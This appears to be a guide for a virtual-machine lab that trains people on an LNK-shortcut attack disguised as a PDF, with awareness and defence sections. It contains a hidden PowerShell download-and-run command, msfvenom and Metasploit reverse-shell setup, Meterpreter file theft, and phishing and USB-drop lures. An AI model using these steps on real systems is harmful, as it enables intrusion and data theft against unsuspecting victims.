# How to Use the Lab

**LNK Exploit - Social Engineering Attack Guide**

---

## Quick Start (Recommended)

The LNK exploit files are **already generated** after setup!

### Step 1: Start the attack on Kali

```bash
cd vagrant
vagrant ssh kali
cd /vagrant/exploits/lnk
./start_lnk_attack.sh
```

This automatically:
- Starts HTTP server on port 8080
- Starts Metasploit handler on port 4444
- Displays delivery instructions

### Step 2: Deliver the fake PDF to Windows

**Method A: Manual Placement (Easiest)**
1. In Windows VM, navigate to: `C:\vagrant\exploits\lnk\`
2. Copy `Q4_Financial_Report.pdf.lnk` to Desktop
3. Double-click the "PDF" file

**Method B: HTTP Download (Realistic)**
1. In Windows VM, open browser
2. Go to: `http://192.168.56.101:8080/`
3. Download `Q4_Financial_Report.pdf.lnk`
4. Save to Desktop and double-click

### Step 3: Get Meterpreter Session!

You should see:
```
[*] Sending stage (175686 bytes) to 192.168.56.102
[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.102:XXXXX)

meterpreter >
```

**That's it!** Three simple steps.

---

## Understanding the Attack

### What the Victim Sees

```
Desktop
  Q4_Financial_Report.pdf
  (Adobe PDF icon, red)
```

- **Filename**: Looks like a PDF document
- **Icon**: Adobe Reader PDF icon (red)
- **Extension**: Hidden by default (.lnk not shown)

### What Actually Happens

```
1. Victim double-clicks "PDF"
2. Windows executes the LNK shortcut
3. LNK runs: powershell.exe -w hidden -ep bypass
4. PowerShell downloads: http://192.168.56.101:8080/shell.ps1
5. PowerShell executes payload in memory
6. Meterpreter connects back to Kali:4444
```

**Key Techniques:**
- Social engineering (fake PDF)
- Hidden PowerShell window (`-w hidden`)
- Fileless execution (runs in memory)
- No disk writes (IEX download string)

---

## Available Scripts

### LNK Exploit Scripts

| Script | Location | Purpose |
|--------|----------|---------|
| `start_lnk_attack.sh` | `/vagrant/exploits/lnk/` | Main attack automation |
| `shell.ps1` | `/vagrant/exploits/lnk/` | PowerShell Meterpreter payload |
| `Q4_Financial_Report.pdf.lnk` | `/vagrant/exploits/lnk/` | Malicious LNK shortcut |

### Attack Automation

**start_lnk_attack.sh does:**
1. Pre-flight checks (files exist, ports available, connectivity)
2. Starts Python HTTP server (port 8080)
3. Creates Metasploit resource script
4. Starts Meterpreter handler (port 4444)
5. Displays delivery instructions
6. Waits for victim to click

---

## Post-Exploitation Commands

### Basic Information

```bash
# System info
meterpreter > sysinfo

# Current user
meterpreter > getuid

# Process info
meterpreter > getpid
meterpreter > ps
```

### Screenshot

```bash
meterpreter > screenshot
```

### File Operations

```bash
# List files
meterpreter > ls

# Change directory
meterpreter > cd C:\\Users\\vagrant\\Desktop

# Download file
meterpreter > download file.txt

# Upload file
meterpreter > upload /path/to/file.txt C:\\Users\\vagrant\\Desktop\\
```

### Windows Command Shell

```bash
# Get Windows shell
meterpreter > shell

# Run commands
C:\> whoami
C:\> ipconfig
C:\> dir

# Exit shell (return to Meterpreter)
C:\> exit
```

### Creating Proof of Exploitation

```bash
# Get shell
meterpreter > shell

# Navigate to Desktop
C:\> cd C:\Users\vagrant\Desktop

# Create proof file
C:\> echo HACKED_VIA_LNK > HACKED_BY_YourName.txt
C:\> echo Attack: Malicious LNK Shortcut >> HACKED_BY_YourName.txt
C:\> echo Date: %DATE% %TIME% >> HACKED_BY_YourName.txt

# Exit shell
C:\> exit

# Download proof
meterpreter > download C:\\Users\\vagrant\\Desktop\\HACKED_BY_YourName.txt
```

---

## Advanced Usage

### Manual Metasploit Configuration

If you want to run Metasploit manually:

```bash
# Start Metasploit
msfconsole -q

# Configure handler
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
set ExitOnSession false
exploit -j

# Start HTTP server in another terminal
cd /vagrant/exploits/lnk
python3 -m http.server 8080
```

### Regenerate LNK Exploit

If you need to regenerate the exploit files:

```bash
# SSH into Kali
vagrant ssh kali

# Run provisioning script
cd /vagrant/vagrant/provisioning/kali
./create_lnk_exploit.sh
```

### Custom Payload

Generate custom PowerShell payload:

```bash
# On Kali
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.56.101 \
    LPORT=4444 \
    -f psh \
    -o /vagrant/exploits/lnk/custom_payload.ps1
```

---

## Delivery Method Scenarios

### Scenario 1: Phishing Email

**Setup:**
1. Start attack script on Kali
2. Host LNK file on HTTP server
3. Craft phishing email

**Email Template:**
```
Subject: Q4 Financial Results - URGENT

Dear Team,

Please review the attached Q4 financial report before
tomorrow's board meeting.

Download: http://192.168.56.101:8080/Q4_Financial_Report.pdf.lnk

Best regards,
CFO
```

**Victim Actions:**
1. Opens email
2. Clicks download link
3. Saves file to Desktop
4. Double-clicks to "open PDF"
5. Gets exploited

### Scenario 2: USB Drop Attack

**Setup:**
1. Copy LNK file to USB drive
2. Label USB: "Executive Salaries 2024"
3. Leave in company parking lot

**Victim Actions:**
1. Finds USB drive
2. Plugs into computer
3. Opens USB to see contents
4. Double-clicks "Executive_Salaries_2024.pdf.lnk"
5. Gets exploited

### Scenario 3: Shared Network Folder

**Setup:**
1. Place LNK file in shared network folder
2. Name: "Company_Policy_Update.pdf.lnk"

**Victim Actions:**
1. Browses shared folder
2. Sees new policy document
3. Double-clicks to open
4. Gets exploited

---

## Troubleshooting

### LNK File Doesn't Execute

**Check:**
1. Verify Windows can reach Kali:
   ```powershell
   Test-Connection 192.168.56.101
   ```

2. Test HTTP server:
   ```powershell
   Invoke-WebRequest http://192.168.56.101:8080/shell.ps1
   ```

3. Test PowerShell command manually:
   ```powershell
   powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.101:8080/shell.ps1')"
   ```

### No Meterpreter Session

**Check:**
1. Verify Metasploit listener is running:
   ```bash
   # In msfconsole
   jobs
   ```

2. Check HTTP server logs:
   ```bash
   cat /tmp/http_server.log
   ```

3. Verify Windows firewall is disabled:
   ```powershell
   Get-NetFirewallProfile | Select Name, Enabled
   ```

### HTTP Server Not Reachable

**Check:**
1. Verify server is running:
   ```bash
   ss -tuln | grep 8080
   ```

2. Test from Kali:
   ```bash
   curl http://192.168.56.101:8080/shell.ps1
   ```

3. Check network connectivity:
   ```bash
   ping 192.168.56.102
   ```

---

## Lab Management

### Reset Lab to Clean State

```bash
./reset.sh
```

This restores both VMs to clean snapshots in ~30 seconds.

### Stop VMs

```bash
cd vagrant
vagrant halt
```

### Start VMs

```bash
cd vagrant
vagrant up
```

### Check VM Status

```bash
cd vagrant
vagrant status
```

### Complete Cleanup

```bash
./cleanup.sh
```

Removes all VMs and frees disk space.

---

## Best Practices

### For Learning

1. **Understand before executing** - Read LNK_EXPLOIT_GUIDE.md first
2. **Try different delivery methods** - Practice all scenarios
3. **Document your findings** - Take notes, screenshots
4. **Practice defenses** - Learn how to detect and prevent
5. **Reset between attempts** - Use `./reset.sh` for clean state

### For Teaching

1. **Demonstrate deception** - Show PDF icon vs actual LNK file
2. **Explain social engineering** - Why victims fall for it
3. **Show network traffic** - Wireshark capture of payload download
4. **Teach defenses** - File extension visibility, PowerShell logging
5. **Discuss ethics** - Real-world implications

### For Security Awareness

1. **Show file extensions** - Windows hides .lnk by default
2. **Verify sources** - Don't trust unexpected files
3. **Question urgency** - "URGENT" emails are often phishing
4. **Check URLs** - Hover before clicking links
5. **Report suspicious files** - Contact IT immediately

---

## Next Steps

1. **Master the basics** - Run automated attack successfully
2. **Try manual mode** - Configure Metasploit yourself
3. **Practice delivery** - Test different social engineering scenarios
4. **Learn defenses** - Configure PowerShell logging, AppLocker
5. **Document findings** - Create professional penetration test report

---

## Additional Resources

**Documentation:**
- [LNK_EXPLOIT_GUIDE.md](LNK_EXPLOIT_GUIDE.md) - Complete technical details
- [TROUBLESHOOTING.md](TROUBLESHOOTING.md) - Common issues
- [docs/LEARNING_OBJECTIVES.md](docs/LEARNING_OBJECTIVES.md) - Educational goals

**External Resources:**
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [MITRE ATT&CK T1204.002](https://attack.mitre.org/techniques/T1204/002/)
- [PowerShell Attack Techniques](https://attack.mitre.org/techniques/T1059/001/)

---

**Ready to practice? Start with the Quick Start guide above!**

---

*Last Updated: 2026-01-09*
*Version: 2.0 - LNK Exploit Lab*
